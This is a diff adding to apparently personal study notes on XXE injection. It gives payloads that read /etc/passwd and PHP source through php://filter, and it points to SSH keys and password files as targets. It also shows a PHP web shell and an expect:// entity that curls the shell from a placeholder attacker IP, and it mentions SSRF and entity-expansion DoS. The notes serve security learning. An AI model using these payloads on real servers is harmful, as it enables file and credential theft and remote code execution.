@@ -788,3 +788,81 @@ this confirms that this request is vulnerable to XXE injections because it repla
 
 some web apps default to JSON format in HTTP request but may still accept other formats like XML   
 to change the format we can try changing the `Content-Type` header to `application/xml` and convert the JSON data to XML with an online tool like convertjson.com 
+
+### Reading sensitive files
+
+we can also use the `SYSTEM` keyword to define the external reference path: 
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+```
+
+![](Images/Pasted%20image%2020240227140834.png)
+
+we successfully read the local file meaning we can also use the vulnerability to look at other files like config files that contain passwords or sensitive files like `id_rsa` ssh key of a user   
+
+note that in some java apps we might be able to specify a directory instead of a file 
+
+### Reading source code 
+
+lets now try to read the source code of the index.php file: 
+
+![](Images/Pasted%20image%2020240227141616.png)
+
+we get an error because the file we are referencing is not in a proper XML format so it fails to be referenced as an external XML entity   
+if a file contains some of XML's special characters `<`, `>`, `&` then it would break the external entity reference and not be used; we also could not read any binary data 
+
+PHP provides wrapper filters that allow us to base64 encode certain resources like files  
+we can use `php://filter/` as a wrapper and specify the `convert.base64-encode` as our filter and then add an input resource `resource=index.php`: 
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+after sending this we can get the base64 encoded string of the index.php file: 
+
+![](Images/Pasted%20image%2020240227142659.png)
+
+### Remote code execution with XXE 
+
+in addition to viewing local files we might also be able to gain RCE, with the easiest method being to look for ssh keys or attempt to utilize a hash stealing trick in windows-based web apps  
+if these don't work then we could still execute commands on PHP based web apps through the `PHP://expect` filter, but this requite the `expect` module to be installed and enabled
+
+if the XXE prints the output as we just saw then we could execute basic commands as `expect://id`   
+if we didn't have access to the output or needed to execute a more complicate command like a reverse shell then the XML syntax may break and not execute 
+
+the most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app 
+
+we can start by writing a basic PHP web shell and starting a python web server: 
+
+```shell
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+```
+
+then inject the following XML to execute a curl command to download our web shell: 
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+```
+
+after sending the request we should receive a request on our machine for the shell.php file   
+however, keep in mind that the `expect` module is not enabled/installed by default on modern php servers 
+
+### Other XXE attacks 
+
+another common attack carried out by XXE vulnerabilities is SSRF exploitation which is used to enumerate locally open ports and access their pages 
+
+another common use of XXE attacks is causing a DoS: 
+
+![](Images/Pasted%20image%2020240227145424.png)
+
+the payload defines `a0` as `DOS`, references it in `a1` multiple times, references `a1` in `a2` and so on until the backend runs out of memory   
+however this no longer works with modern web servers like apache since they protect against entity self-references   
